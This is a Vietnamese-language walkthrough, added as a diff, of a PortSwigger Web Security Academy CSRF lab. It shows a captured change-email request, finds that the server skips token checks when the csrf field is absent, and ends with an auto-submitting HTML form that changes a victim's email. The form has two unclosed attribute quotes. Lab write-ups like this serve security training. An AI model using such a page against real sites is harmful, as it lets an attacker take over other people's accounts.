@@ -1,0 +1,32 @@
+CSRF - CSRF where token validation depends on token being present
+
+End Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
+You can log in to your own account using the following credentials: wiener:peter
+
+Analystic
+---------
+Bước 1: Mở trình duyệt của Burp và truy cập link của lab, thực hiện đăng nhập 
+Bước 2: Thực hiện thay đổi email của tài khoản hiện có, sau đó quan sát trong history ta thấy có 1 request như sau:
+POST /my-account/change-email HTTP/2
+Host: 0a4900c4045d34d88070624b0033007f.web-security-academy.net
+Cookie: session=o2kP7Zk2NaiHhOg15gKp443aaqkd9Psr
+.......
+email=qwe%40gmail.com&csrf=hPF6oYRGUhMdDNYKYXrCJEUG2Y9QHuPj
+Từ request trên, ta có được 1 số thông tin:
+method sử dụng: POST
+endpoint: /my-account/change-email
+Có Cookie session
+khi thay đổi email cần 2 giá trị là email và csrf 
+Bước 3: 
+Gửi request này tới repeater, thử xóa phần csrf và gửi lại gói tin, ta thấy nhận được status code là 302 thay vì 400 và không hiển thị invalid CSRF token --> ta có thể thực hiện gửi request nếu xóa bỏ hẳn phần csrf (tức là trang web chỉ so khớp giá trị csrf nếu trong request có phần này, nếu không có thì ko so sánh).
+Bước 4:
+Từ đây ta có thể mô phỏng lại request này mà không thêm input của csrf vào:
+<html>
+<body>
+<form action="URL của lab" method="POST>
+<input type="hidden" name="email" value="tmt@gmail.com>
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+
